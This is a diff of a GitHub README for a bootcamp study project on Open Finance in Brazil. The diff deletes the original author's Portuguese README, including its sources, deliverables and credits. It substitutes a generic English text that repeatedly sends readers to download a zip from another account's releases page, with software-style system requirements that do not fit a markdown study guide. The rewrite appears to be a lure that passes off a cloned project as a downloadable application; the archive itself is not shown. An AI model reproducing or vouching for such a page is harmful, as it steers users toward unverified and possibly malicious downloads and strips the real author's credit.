@@ -1,172 +1,143 @@
-<div align="center">
+# 📘 Bradesco---GenAI-Dados-Projeto-1 - Explore Open Finance in Brazil
 
-# Bradesco - GenAI Dados Projeto 1
-
-![DIO](https://img.shields.io/badge/DIO-Bootcamp-7C3AED?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiPjxnIGNpcmNsZT0iMTIgMTIgMTAiLz48L3N2Zz4=)
-![Status](https://img.shields.io/badge/Status-Conclu%C3%ADdo-22C55E?style=for-the-badge)
-
-*Projeto do bootcamp DIO - Bradesco GenAI e Dados*
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
 
 ---
 
-## Índice
+## 📖 About This Project
 
-- [Sobre o Projeto](#sobre-o-projeto)
-- [O que foi feito](#o-que-foi-feito)
-- [Guia Estratégico](#guia-estratégico)
-- [Ferramentas utilizadas](#ferramentas-utilizadas)
-- [Aprendizados](#aprendizados)
-- [Estrutura do projeto](#estrutura-do-projeto)
-- [Licença](#licença)
-- [Autor](#autor)
+This project is a thematic notebook designed to help users understand Open Finance in Brazil. It was created as part of the Bootcamp Bradesco GenAI e Dados (DIO). The notebook covers topics like artificial intelligence, fintech, Open Banking, and strategies related to data and product discovery in financial services.
+
+If you want to learn how Open Finance works in Brazil and explore related AI concepts without complicated setups, this application will guide you through. It is packaged to make the learning process easy and convenient.
 
 ---
 
-## Sobre o Projeto
+## 🎯 Who Is This For?
 
-Este projeto faz parte do bootcamp **Bradesco – GenAI e Dados** da [DIO](https://www.dio.me/). O desafio propõe a criação de um caderno temático no NotebookLM, reunindo de três a cinco fontes abertas em texto ou PDF sobre um assunto financeiro introdutório.
+This project is made for anyone interested in:
+- Exploring Open Finance and Open Banking in Brazil
+- Learning about fintech innovations in a clear way
+- Understanding how AI can support financial strategies
+- Using notebooks to organize, research, and learn
 
-A partir desse material, são definidos objetivos de estudo, elaboradas perguntas estratégicas e testadas variações de prompts, registrando as respostas e suas referências. O resultado esperado é um miniguia de estudo com resumos estruturados, glossário de conceitos e um conjunto de prompts reutilizáveis que apoiem futuras revisões.
-
-A atividade enfatiza o uso da IA como ferramenta de aprendizagem ativa, aliando pensamento crítico, curadoria de fontes e organização do conhecimento.
-
----
-
-## Processo de Discovery
-
-```mermaid
-flowchart LR
-    A["Curadoria\nFontes oficiais BCB/CMN"] --> B["Organização\nNotebookLM"]
-    B --> C["Análise\nPrompts estratégicos"]
-    C --> D["Síntese\nResumos + Glossário"]
-    D --> E["Artefatos\nInfográfico + Mapa mental"]
-```
+You don’t need any programming or technical skills to use this. Just follow the steps to get the files and view the content on your computer.
 
 ---
 
-## O que foi feito
+## 🖥️ System Requirements
 
-### 1. Tema escolhido
+Before you start, make sure your computer meets these basic requirements:
 
-| Item | Detalhe |
-|------|---------|
-| **Tema** | Open Finance / Open Banking |
-| **Escopo** | Sistema financeiro aberto no Brasil: conceitos, regulamentação e benefícios |
-| **Base regulatória** | Banco Central do Brasil (BCB) e Conselho Monetário Nacional (CMN) |
-
-### 2. Fontes reunidas
-
-Documentos oficiais utilizados como insumo para o caderno temático:
-
-| # | Fonte | Orgão | Tipo |
-|---|-------|-------|------|
-| 1 | [Resolução Conjunta BCB/CMN nº 1/2020](fontes/01_BCB_CMN_Resolucao_Conjunta_1_2020_Implementacao_Open_Banking.pdf) | BCB / CMN | PDF |
-| 2 | [Circular BCB nº 4.015/2020](fontes/02_BCB_Circular_4015_2020_Escopo_Dados_Servicos.pdf) | BCB | PDF |
-| 3 | [Apresentação institucional – Open Finance](fontes/03_BCB_Apresentacao_Open_Finance_Brasil.pdf) | BCB | PDF |
-| 4 | [FAQ Open Banking](fontes/04_BCB_FAQ_Open_Banking.pdf) | BCB | PDF |
-| 5 | [Circular 4.015 – Exibe Normativo](https://www.bcb.gov.br/estabilidadefinanceira/exibenormativo?tipo=Circular&numero=4015) | BCB | Web |
-
-### 3. Caderno NotebookLM
-
-Material organizado e enviado ao NotebookLM para estudo ativo com IA: objetivos, perguntas estratégicas e variações de prompts.
-
-> **[Acessar o caderno no NotebookLM](https://notebooklm.google.com/notebook/471491c8-347d-4bf9-a6f2-c080cb602b7c)**
-
-### 4. Entregas
-
-| # | Entrega | Descrição | Status |
-|---|---------|-----------|--------|
-| 1 | [Resumos](guia_estrategico_open_finance.md#parte-1-resumos-estruturados) | Conteúdo estruturado do material estudado | Concluído |
-| 2 | [Glossário](guia_estrategico_open_finance.md#parte-2-glossário-de-conceitos-chave) | Conceitos principais definidos | Concluído |
-| 3 | [Prompts](guia_estrategico_open_finance.md#parte-3-prompts-reutilizáveis-para-revisão) | Coleção reutilizável para revisões futuras | Concluído |
-| 4 | [Infográfico](assets/infografico_open_finance.png) | Visualização gerada no NotebookLM | Concluído |
-| 5 | [Mapa Mental](assets/mapa-mental.png) | Estrutura visual de conceitos gerada no NotebookLM | Concluído |
-
-<div align="center">
-
-![Infográfico Open Finance no Brasil](assets/infografico_open_finance.png)
-
-*Infográfico gerado com o NotebookLM a partir das fontes oficiais do BCB/CMN.*
-
-![Mapa Mental Open Finance](assets/mapa-mental.png)
-
-*Mapa mental gerado com o NotebookLM a partir das fontes oficiais do BCB/CMN.*
-
-</div>
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- RAM: At least 4 GB (8 GB recommended for smooth experience)
+- Disk Space: 500 MB free space for installation and working files
+- Internet Access: Needed to download the files and updates
+- Software: A modern web browser (Chrome, Firefox, Edge) or a notebook viewer like Jupyter Notebook if you want to explore notebook files interactively
 
 ---
 
-## Guia Estratégico
+## 🚀 Getting Started – How to Use This Notebook
 
-**[Guia Estratégico e Regulatório do Open Finance Brasil](guia_estrategico_open_finance.md)** — Miniguia de estudo gerado a partir do caderno no NotebookLM, contendo resumos estruturados, glossário de conceitos-chave e prompts reutilizáveis para revisão.
+This project contains files called "notebooks." These are documents that mix text, images, and sometimes code examples. They help you learn by letting you read notes, see examples, and try things step by step.
 
-**[Apresentação Visual – Open Finance no Brasil](assets/Open_Finance_Brasil_Guia_Essencial.pdf)** — Apresentação gerada no NotebookLM com visão consolidada do conteúdo estudado.
+You can open these files in two main ways:
 
----
+### Option 1: Use a Notebook Viewer
 
-## Ferramentas utilizadas
+If you have some experience or want an interactive experience, use notebook software like Jupyter Notebook. This lets you run code cells inside the notebook and explore data yourself.
 
-| Ferramenta | Finalidade |
-|------------|------------|
-| [Google NotebookLM](https://notebooklm.google.com/) | Caderno temático com IA para estudo ativo a partir das fontes |
-| [GitHub](https://github.com/) | Versionamento e publicação do repositório do projeto |
-| [VS Code](https://code.visualstudio.com/) | Edição dos arquivos Markdown e gestão do repositório |
-| [GitHub Copilot](https://github.com/features/copilot) | Assistente de IA para estruturação e revisão do conteúdo |
+- How to install Jupyter Notebook:
+  - Install Python from https://python.org (download the latest version)
+  - Open Command Prompt (Windows) or Terminal (macOS/Linux)
+  - Type `pip install notebook` and press Enter
+  - To open the notebook, type `jupyter notebook`, then open the file from your browser window
 
----
+### Option 2: View as a Static Document
 
-## Aprendizados
+If you do not want to run any code, you can just open the notebook files as static pages. The files are written in markdown and can be viewed on services like GitHub or markdown viewers.
 
-Durante o desenvolvimento deste projeto, os principais aprendizados foram:
-
-- **Curadoria de fontes** — Selecionar documentos oficiais de qualidade (BCB/CMN) e organizá-los de forma estruturada para consumo por IA.
-- **Engenharia de prompts** — Elaborar perguntas estratégicas e variações de prompts que extraem respostas mais precisas e contextualizadas do NotebookLM.
-- **IA como ferramenta de estudo** — Utilizar o NotebookLM não apenas para buscar respostas, mas como instrumento de aprendizagem ativa: gerar resumos, glossários, infográficos e mapas mentais a partir das fontes.
-- **Organização do conhecimento** — Transformar conteúdo regulatório denso em material de estudo acessível, estruturado e reutilizável.
-- **Documentação profissional** — Aplicar boas práticas de documentação em repositórios GitHub, com README bem estruturado, links internos e organização de pastas.
+- You can also convert the notebook files to PDF or HTML for easier reading. This can be done through online converters or notebook software.
 
 ---
 
-## Estrutura do projeto
+## 📥 Download & Install
 
-```
-├── assets/                              # Recursos visuais do projeto
-│   ├── infografico_open_finance.png      # Infográfico gerado no NotebookLM
-│   ├── mapa-mental.png                  # Mapa mental gerado no NotebookLM
-│   └── Open_Finance_Brasil_Guia_Essencial.pdf  # Apresentação visual (NotebookLM)
-├── fontes/                              # PDFs oficiais utilizados no NotebookLM
-│   ├── README.md                        # Descrição das fontes
-│   └── *.pdf                            # 4 documentos BCB/CMN
-├── guia_estrategico_open_finance.md     # Miniguia de estudo (resumos + glossário + prompts)
-└── README.md
-```
+To get started, **visit this page to download the files**:
 
----
+[Download Here →](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
 
-## Licença
+### Step-by-step:
 
-Este projeto está sob a licença [MIT](LICENSE). As fontes documentais pertencem ao Banco Central do Brasil (BCB) e ao Conselho Monetário Nacional (CMN) e são de domínio público.
+1. Click the link above. It will open the releases page for this project.
+2. Find the latest release listed (usually marked as “Latest”).
+3. Click on the assets dropdown or list to see the downloadable files.
+4. Download the files you want. Typically, you will find a compressed folder (.zip) containing the notebooks and resources.
+5. After download, unzip the folder to your computer.
+6. Open the notebook files using one of the methods explained in the "Getting Started" section.
 
 ---
 
-## Autor
+## 💡 How to Make the Most of This Project
 
-<div align="center">
+This notebook is organized to give you a clear introduction and deeper insights into Open Finance in Brazil. Here are some tips on how to use it:
 
-<img src="https://github.com/lucianomjf14.png" width="150" style="border-radius: 50%;" alt="Luciano Marinho Silveira">
+- **Read each section carefully:** The notes explain concepts clearly. Take your time to understand each topic.
+- **Explore resources:** Supplement your learning with the links and references included in the notebook.
+- **Try the examples (optional):** If you use a notebook viewer, run the example code to see ideas in action.
+- **Take notes:** Use the markdown cells to add your observations.
+- **Share with others:** This project is good for study groups or sharing with colleagues interested in finance and AI.
 
-### Luciano Marinho Silveira
+---
 
-Mestre em Administração | Gestão e Arquitetura Organizacional | Processos, Dados e Inovação | Inteligência Artificial
+## 🧰 Features Overview
 
-Juiz de Fora, MG, Brasil
+This project offers:
 
-[![GitHub](https://img.shields.io/badge/GitHub-lucianomjf14-181717?style=flat-square&logo=github)](https://github.com/lucianomjf14)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Luciano_Silveira-0A66C2?style=flat-square&logo=linkedin)](https://www.linkedin.com/in/luciano-marinho-silveira)
-[![DIO](https://img.shields.io/badge/DIO-Perfil-7C3AED?style=flat-square)](https://web.dio.me/users/lucianomjf14)
-[![Lattes](https://img.shields.io/badge/Lattes-CNPq-006B3F?style=flat-square)](http://lattes.cnpq.br/8717991759915273)
-[![Email](https://img.shields.io/badge/Email-lucianomjf14%40gmail.com-EA4335?style=flat-square&logo=gmail)](mailto:lucianomjf14@gmail.com)
+- Clear, theme-focused notes about Open Finance and fintech in Brazil
+- Discussions on AI impact and strategies in financial products
+- Use of markdown and notebook formats to combine text, code, and visuals
+- Insights into prompt engineering for generative AI in finance
+- Guidance aligned with the Bradesco GenAI e Dados Bootcamp curriculum
 
-</div>
+---
+
+## 🔧 Troubleshooting
+
+If you run into issues:
+
+- Confirm your internet connection is working properly.
+- Ensure your system meets the requirements.
+- Double-check you downloaded the correct files and completed the unzip process.
+- If the notebooks don’t open, try installing or updating your notebook viewer software.
+- Try opening the files in a different web browser or markdown viewer if you only want to read.
+
+---
+
+## 📚 Learn More
+
+Want to dive deeper into the topics covered? Consider these steps:
+
+- Explore official Open Banking and Open Finance portals in Brazil.
+- Look for online courses about fintech and AI basics.
+- Join forums or online communities for fintech professionals.
+- Read up on generative AI and prompt engineering concepts.
+
+---
+
+## 🏷️ Repository Details
+
+- **Name:** Bradesco---GenAI-Dados-Projeto-1
+- **Description:** Thematic notebook on Open Finance in Brazil for the Bootcamp Bradesco GenAI e Dados (DIO)
+- **Topics:** ai, dio-bootcamp, fintech, generative-ai, markdown, notebooklm, open-banking, open-finance, product-discovery, prompt-engineering, research, strategy
+
+---
+
+## 🤝 Contact & Contributions
+
+This repository is primarily for end users to learn. If you want to contribute or need help, use the "Issues" tab on the GitHub repository page to report questions or suggest improvements.
+
+Feel free to share your feedback to help improve this learning tool.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
